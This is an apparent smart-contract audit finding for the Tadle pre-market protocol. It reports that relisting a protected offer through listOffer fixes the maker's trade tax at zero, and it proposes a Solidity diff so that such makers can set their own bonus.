As mentioned in the docs [here](https://tadle.gitbook.io/tadle/how-tadle-works/features-and-terminologies/maker-bonus), a Maker receives rewards(maker bonuses) for providing liquidity/collateral to the market. Makers are also allowed to dynamically set the percentage of fees they want to earn.

Also important to note here is that for protected offers each subsequent re-listing creates a new Maker as seen by the docs [here](https://tadle.gitbook.io/tadle/how-tadle-works/mechanics-of-tadle/protected-mode#for-sell-offers)(on Transaction #3) _Bob is now a Maker_.

However the `PreMarkets::listOffer`  does not include this functionality for protected offers and as seen in the code [here](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L381-L381), the trade tax(which is the maker bonus) is set to 0.

## Impact

MEDIUM - Market Makers via relisting protected offers cannot set their maker bonus

## Tools Used

Manual Review

## Recommendations

`createTaker` and `listOffer` should be modified as shown below

```diff
 function listOffer(
        address _stock,
        uint256 _amount,
        uint256 _collateralRate,
+       uint256 _tradeTax
    ) external payable {

        //...ommited function body for brevity as it is irrelevant

        /// @dev change abort offer status when offer settle type is turbo
        if (makerInfo.offerSettleType == OfferSettleType.Turbo) {
            address originOffer = makerInfo.originOffer;
            OfferInfo memory originOfferInfo = offerInfoMap[originOffer];

            if (_collateralRate != originOfferInfo.collateralRate) {
                revert InvalidCollateralRate();
            }
            originOfferInfo.abortOfferStatus = AbortOfferStatus.SubOfferListed;
        }

        /// @dev transfer collateral when offer settle type is protected
        if (makerInfo.offerSettleType == OfferSettleType.Protected) {

+           if (_tradeTax > Constants.EACH_TRADE_TAX_DECIMAL_SCALER) {
+               revert InvalidEachTradeTaxRate();
+           }
            uint256 transferAmount = OfferLibraries.getDepositAmount(
                offerInfo.offerType,
                offerInfo.collateralRate,
                _amount,
                true,
                Math.Rounding.Ceil
            );

            ITokenManager tokenManager = tadleFactory.getTokenManager();
            tokenManager.tillIn{value: msg.value}(
                _msgSender(),
                makerInfo.tokenAddress,
                transferAmount,
                false
            );
        }

        address offerAddr = GenerateAddress.generateOfferAddress(stockInfo.id);
        if (offerInfoMap[offerAddr].authority != address(0x0)) {
            revert OfferAlreadyExist();
        }

        /// @dev update offer info
        offerInfoMap[offerAddr] = OfferInfo({
            id: stockInfo.id,
            authority: _msgSender(),
            maker: offerInfo.maker,
            offerStatus: OfferStatus.Virgin,
            offerType: offerInfo.offerType,
            abortOfferStatus: AbortOfferStatus.Initialized,
            points: stockInfo.points,
            amount: _amount,
            collateralRate: _collateralRate,
            usedPoints: 0,
-           tradeTax: 0,
+           tradeTax: makerInfo.offerSettleType == OfferSettleType.Turbo ? 0 : _tradeTax,
            settledPoints: 0,
            settledPointTokenAmount: 0,
            settledCollateralAmount: 0
        });

        stockInfo.offer = offerAddr;

        emit ListOffer(
            offerAddr,
            _stock,
            _msgSender(),
            stockInfo.points,
            _amount
        );
    }

  function createTaker(address _offer, uint256 _points) external payable {

        // ...ommiteed function body for brevity

        /// @dev Transfer token from user to capital pool as collateral
        uint256 depositAmount = _points.mulDiv(
            offerInfo.amount,
            offerInfo.points,
            Math.Rounding.Ceil
        );
        uint256 platformFee = depositAmount.mulDiv(
            platformFeeRate,
            Constants.PLATFORM_FEE_DECIMAL_SCALER
        );
        uint256 tradeTax = depositAmount.mulDiv(
-           makerInfo.eachTradeTax,
+           makerInfo.offerSettleType == OfferSettleType.Turbo ? makerInfo.eachTradeTax : offerInfo.tradeTax,
            Constants.EACH_TRADE_TAX_DECIMAL_SCALER
        );
        //...ommited remaining function body as it is irrelevant
  }
```





    